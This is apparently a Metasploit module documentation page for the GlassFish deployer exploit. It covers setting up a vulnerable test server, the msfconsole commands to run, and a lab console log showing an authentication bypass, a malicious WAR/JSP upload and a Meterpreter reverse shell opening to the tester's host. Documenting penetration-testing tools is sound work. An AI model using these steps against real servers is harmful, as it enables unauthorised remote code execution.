{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/http/glassfish_deployer","result":{"data":{"moduleMetadataJson":{"id":"3263f75d-28b7-5b53-b793-905aa8206aa1","name":"Sun/Oracle GlassFish Server Authenticated Code Execution","fullname":"exploit/multi/http/glassfish_deployer","description":"This module logs in to a GlassFish Server (Open Source or Commercial) using various\n        methods (such as authentication bypass, default credentials, or user-supplied login),\n        and deploys a malicious war file in order to get remote code execution. It has been\n        tested on Glassfish 2.x, 3.0, 4.0 and Sun Java System Application Server 9.x. Newer\n        GlassFish versions do not allow remote access (Secure Admin) by default, but is required\n        for exploitation.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/multi/http/glassfish_deployer","documentationSlug":"/modules/documentation/exploit/multi/http/glassfish_deployer"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<h3 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h3>\n<p>This module logs in to a GlassFish Server (Open Source or Commercial) using various methods (such as authentication bypass, default credentials, or user-supplied login), and deploys a malicious war file in order to get remote code execution. It has been tested on Glassfish 2.x, 3.0, 4.0 and Sun Java System Application Server 9.x. Newer GlassFish versions do not allow remote access (Secure Admin) by default, but is required for exploitation.</p>\n<h3 id=\"glassfish\" style=\"position:relative;\"><a href=\"#glassfish\" aria-label=\"glassfish permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>GlassFish</h3>\n<p>GlassFish is a open-source application server project started by Sun Microsystems for the Java EE platform and now sponsored by Oracle Corporation. The supported version is called Oracle GlassFish Server. GlassFish is free software, dual-licensed under two free software licences: the Common Development and Distribution License (CDDL) and the GNU General Public License (GPL) with the classpath exception.</p>\n<h3 id=\"installation\" style=\"position:relative;\"><a href=\"#installation\" aria-label=\"installation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Installation</h3>\n<p>For testing purposes, the following explains how you can install a vulnerable version of GlassFish on Ubuntu Linux:</p>\n<ol>\n<li>Make sure you have a clean Ubuntu box</li>\n<li>Open a terminal on the Ubuntu box, and do: <code class=\"language-text\">sudo apt-get install default-jdk</code>. We assume this gives you JDK 8.</li>\n<li>Download <a href=\"http://download.java.net/glassfish/4.0/release/glassfish-4.0.zip\">GlassFish 4.0</a></li>\n<li>Unzip GlassFish-4.0, navigate to the bin directory, and then start <code class=\"language-text\">asadmin</code></li>\n<li>In the asadmin console, do <code class=\"language-text\">start-domain domain1</code>. This will start GlassFish.</li>\n<li>On the Ubuntu box, go to <a href=\"http://localhost:4848\">http://localhost:4848</a> with a browser</li>\n<li>On the left menu, click on <code class=\"language-text\">Domain</code></li>\n<li>On the right, click on <code class=\"language-text\">Administrator Password</code></li>\n<li>Set a new password for admin</li>\n<li>On the left menu, click on <code class=\"language-text\">server (Admin server)</code></li>\n<li>On the right, click on <code class=\"language-text\">Secure Administrator</code></li>\n<li>Click on <code class=\"language-text\">Enable Secure Admin</code></li>\n<li>You will need to wait for up to a minute to make sure GlassFish is up and running again on port 4848.</li>\n</ol>\n<p>If you are on a different platform (such as Windows), the installation should be quite similar.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Do: <code class=\"language-text\">use exploit/multi/http/glassfish_deployer</code></li>\n<li>Do: <code class=\"language-text\">set RHOST [IP]</code></li>\n<li>Do: <code class=\"language-text\">set USERNAME [Username]</code></li>\n<li>Do: <code class=\"language-text\">set PASSWORD [Password]</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"glassfish-301-on-windows-2003\" style=\"position:relative;\"><a href=\"#glassfish-301-on-windows-2003\" aria-label=\"glassfish 301 on windows 2003 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>GlassFish 3.0.1 on Windows 2003</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/multi/http/glassfish_deployer\nmsf exploit(glassfish_deployer) &gt; set RHOST 172.16.182.237\nRHOST =&gt; 172.16.182.237\nmsf exploit(glassfish_deployer) &gt; set USERNAME admin\nUSERNAME =&gt; admin\nmsf exploit(glassfish_deployer) &gt; set PASSWORD admin123\nPASSWORD =&gt; admin123\nmsf exploit(glassfish_deployer) &gt; exploit\n[*] Started reverse TCP handler on 172.16.182.112:4444 \n[*] Glassfish edition: GlassFish Server Open Source Edition 3.0.1\n[*] Trying GlassFish authentication bypass..\n[+] http://172.16.182.237:4848// - GlassFish - SUCCESSFUL authentication bypass\n[*] Uploading payload...\n[*] Successfully uploaded\n[*] Executing /icDfejbl6Vc9ZobfgVv9LIBES/SV7fVtWuTQFZqtzMPiJ.jsp...\n[*] Sending stage (30355 bytes) to 172.16.182.237\n[*] Meterpreter session 1 opened (172.16.182.112:4444 -&gt; 172.16.182.237:1472) at 2017-03-27 19:07:58 -0500\n[*] Getting information to undeploy...\n[*] Undeploying icDfejbl6Vc9ZobfgVv9LIBES...\n[*] Undeployment complete.\n\nmeterpreter &gt; getuid\nServer username: Administrator\nmeterpreter &gt; sysinfo\nComputer    : juan-6ed9db6ca8\nOS          : Windows 2003 5.2 (x86)\nMeterpreter : java/java\nmeterpreter &gt; exit\n[*] Shutting down Meterpreter...</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"3263f75d-28b7-5b53-b793-905aa8206aa1"}}}